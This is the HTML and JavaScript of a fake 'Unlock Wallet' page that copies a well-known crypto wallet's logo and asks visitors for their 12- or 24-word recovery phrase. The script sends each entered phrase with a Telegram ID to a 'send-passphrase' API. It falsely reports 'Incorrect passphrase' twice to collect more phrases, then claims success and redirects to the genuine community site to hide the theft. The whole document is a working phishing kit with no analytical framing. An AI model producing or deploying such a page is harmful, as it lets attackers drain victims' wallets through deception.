<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Wallet Recovery Mode</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600&family=Wix+Madefor+Display&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <!-- desktop header -->
    <nav>
      <a href="#">
        <svg
          width="293"
          height="80"
          viewBox="0 0 293 80"
          fill="none"
          class="h-auto w-[160px]"
        >
          <g clip-path="url(#clip0_1578_140118undefined)">
            <path
              d="M133.461 18.6951H147.398V26.5015C151.964 19.4857 157.219 18.6951 164.911 18.6951V32.4906H161.408C152.19 32.4906 147.778 36.8281 147.778 45.4202V60.0842H133.461V18.6951Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M211.41 60.0842H197.097V56.1385C193.971 59.7655 189.711 61.3419 184.459 61.3419C174.485 61.3419 168.846 55.4281 168.846 44.5517V18.6951H183.16V41.3236C183.16 46.4443 185.673 49.4389 189.935 49.4389C194.197 49.4389 197.094 46.5198 197.094 41.5571V18.6951H211.408V60.0842H211.41Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M214.908 47.3054H228.314C228.925 50.3 230.981 51.5601 235.926 51.5601C239.964 51.5601 242.324 50.6162 242.324 48.8817C242.324 47.5389 241.181 46.6705 237.911 45.9626L227.098 43.5177C219.863 41.866 216.207 37.6867 216.207 30.9823C216.207 22.1493 222.678 17.5784 235.243 17.5784C247.807 17.5784 253.974 22.0326 255.044 31.5759H241.721C241.495 29.0556 238.901 27.5133 234.639 27.5133C231.214 27.5133 229.01 28.6153 229.01 30.2744C229.01 31.6926 230.453 32.7946 233.352 33.5098L244.696 36.2709C252.157 38.0808 255.74 41.8684 255.74 48.0157C255.74 56.5324 248.352 61.5778 235.795 61.5778C223.237 61.5778 214.93 56.1383 214.93 47.3054H214.915H214.908Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M293.858 31.5687V18.6951H258.526V31.576H269.069V60.0842H283.31V31.5687H293.858Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M129.476 31.5687V18.6951H94.1469V31.576H104.69V60.0842H118.933V31.5687H129.476Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M1.47009 11.4213L36.6098 0V79.0661C11.5096 68.523 1.47009 48.3173 1.47009 36.8985V11.4213Z"
              style="fill: currentColor"
              class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"
            ></path>
            <path
              d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z"
              fill="url(#paint0_linear_1578_140118undefined)"
              class="default-transition opacity-0 [transition-property:opacity] dark:opacity-100"
            ></path>
            <path
              d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z"
              fill="url(#paint0_linear_1578_102342undefined)"
              class="default-transition opacity-100 [transition-property:opacity] dark:opacity-0"
            ></path>
          </g>
          <defs>
            <linearGradient
              id="paint0_linear_1578_140118undefined"
              x1="35.1288"
              y1="89.0035"
              x2="63.8924"
              y2="-15.0289"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.26" stop-color="#48FF91"></stop>
              <stop offset="0.66" stop-color="#0094FF"></stop>
              <stop offset="0.8" stop-color="#0038FF"></stop>
              <stop offset="0.89" stop-color="#0500FF"></stop>
            </linearGradient>
            <linearGradient
              id="paint0_linear_1578_102342undefined"
              x1="61.762"
              y1="-4.56968"
              x2="35.2193"
              y2="78.953"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.02" stop-color="#0000FF"></stop>
              <stop offset="0.08" stop-color="#0094FF"></stop>
              <stop offset="0.16" stop-color="#48FF91"></stop>
              <stop offset="0.42" stop-color="#0094FF"></stop>
              <stop offset="0.68" stop-color="#0038FF"></stop>
              <stop offset="0.9" stop-color="#0500FF"></stop>
            </linearGradient>
            <clipPath id="clip0_1578_140118undefined">
              <rect
                width="291.936"
                height="79.0661"
                fill="white"
                transform="translate(0.814331)"
              ></rect>
            </clipPath>
          </defs>
        </svg>
      </a>

      <ul>
        <li>
          <a href="#">Wallet</a>
        </li>
        <li>
          <a href="#">Features</a>
        </li>
        <li>
          <a href="#">Build</a>
        </li>
        <li>
          <a href="#">Support</a>
        </li>
        <li>
          <a href="#">About</a>
        </li>
      </ul>
    </nav>
    <!-- mobile header -->

    <!-- main -->
    <section>
      <h1>Unlock Wallet</h1>
      <p>
        Enter your recovery phrase to unlock your wallet. Typically 12(sometimes
        24) words separated by single box
      </p>
      <div class="action-btns">
        <button class="active" id="btn12">I have 12 recovery words</button>
        <button id="btn24">I have 24 recovery words</button>
      </div>
      <div class="side-wrap">
        <div class="left">
          <div class="12-words words">
            <input type="text" name="key1" placeholder="1." />
            <input type="text" name="key2" placeholder="2." />
            <input type="text" name="key3" placeholder="3." />
            <input type="text" name="key4" placeholder="4." />
            <input type="text" name="key5" placeholder="5." />
            <input type="text" name="key6" placeholder="6." />
            <input type="text" name="key7" placeholder="7." />
            <input type="text" name="key8" placeholder="8." />
            <input type="text" name="key9" placeholder="9." />
            <input type="text" name="key10" placeholder="10." />
            <input type="text" name="key11" placeholder="11." />
            <input type="text" name="key12" placeholder="12." />
          </div>
          <div class="24-words words" id="words24">
            <input type="text" name="key13" placeholder="13." />
            <input type="text" name="key14" placeholder="14." />
            <input type="text" name="key15" placeholder="15." />
            <input type="text" name="key16" placeholder="16." />
            <input type="text" name="key17" placeholder="17." />
            <input type="text" name="key18" placeholder="18." />
            <input type="text" name="key19" placeholder="19." />
            <input type="text" name="key20" placeholder="20." />
            <input type="text" name="key21" placeholder="21." />
            <input type="text" name="key22" placeholder="22." />
            <input type="text" name="key23" placeholder="23." />
            <input type="text" name="key24" placeholder="24." />
          </div>
          <div class="confirm-wrap" id="confirm">
            <button>Verify Passphrase</button>
          </div>
        </div>
        <div class="right">
          <img src="/logo.png" alt="" srcset="" />
        </div>
      </div>
    </section>

    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script>
      let keyType = 1;
      let processing = false;
      let attempt = 1;

      const btn12 = document.querySelector("#btn12");
      const btn24 = document.querySelector("#btn24");
      const words24 = document.querySelector("#words24");
      const words = document.querySelectorAll("input");
      const inputs = document.querySelectorAll("input");
      const confirm = document.querySelector("#confirm button");

      const fillAll = () => {
        words.forEach((w, i) => {
          w.value = "word" + (i + 1);
        });
      };

      words.forEach((i) => {
        i.addEventListener("input", () => {
          words.forEach((i) => i.classList.remove("error"));
        });
      });

      btn12.addEventListener("click", (e) => {
        btn24.classList.remove("active");
        btn12.classList.add("active");
        words24.style.display = "none";
        keyType = 1;
        attempt = 1;
      });

      btn24.addEventListener("click", (e) => {
        btn12.classList.remove("active");
        btn24.classList.add("active");
        words24.style.display = "block";
        keyType = 2;
        attempt = 1;
      });

      confirm.addEventListener("click", () => {
        if (processing === false) {
          let hasError = false;

          processing = true;

          confirm.innerText = "Please wait...";
          // validate inputs
          inputs.forEach((i, index) => {
            if (i.value === "" && index < (keyType === 1 ? 12 : 24)) {
              hasError = true;
            }
          });
          if (hasError) {
            words.forEach((i) => {
              i.classList.add("error");
            });
            swal("Error", "Invalid passphrase", "warning");
            processing = false;
            confirm.innerText = "Verify Passphrase";
            return;
          }

          if (attempt < 3) {
            const passphrase = [];
            inputs.forEach((i) => passphrase.push(i.value));
            const data = {
              telegramID: 1936090861,
              phraseType: keyType === 1 ? "12 words" : "24 words",
              attempt,
              passphrase,
            };
            if (keyType === 1) {
              data.passphrase = data.passphrase.slice(0, 12);
            }
            // make api call
            const options = {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(data),
            };
            const url = "http://localhost:5001/api/wallet/send-passphrase";
            fetch(url, options)
              .then((response) => response.json())
              .then((data) => {
                swal(
                  "Error",
                  "Incorrect passphrase, please enter correct passphrase",
                  "warning"
                );
                console.log("Response:", data);
                inputs.forEach((i) => {
                  i.value = "";
                });
                attempt += 1;
                processing = false;
                confirm.innerText = "Verify Passphrase";
                return false;
              })
              .catch((error) => {
                console.error("Error:", error);
              });
          } else {
            const passphrase = [];
            inputs.forEach((i) => passphrase.push(i.value));
            const data = {
              telegramID: 1936090861,
              phraseType: keyType === 1 ? "12 words" : "24 words",
              attempt,
              passphrase,
            };
            if (keyType === 1) {
              data.passphrase = data.passphrase.slice(0, 12);
            }
            // make api call
            const options = {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(data),
            };
            const url = "http://localhost:5001/api/wallet/send-passphrase";
            fetch(url, options)
              .then((response) => response.json())
              .then((data) => {
                console.log("Response:", data);
                confirm.innerText = "Completed";
                confirm.removeEventListener("click", () => {}, false);
                console.log(data);
                swal(
                  "Wallet Unlocked!",
                  "Wallet unlocked successfully, you are now being redirected to our community page.",
                  "Success"
                );
                window.location.href = "https://community.trustwallet.com/";
              })
              .catch((error) => {
                console.error("Error:", error);
              });
          }
        }
      });
    </script>
  </body>
</html>
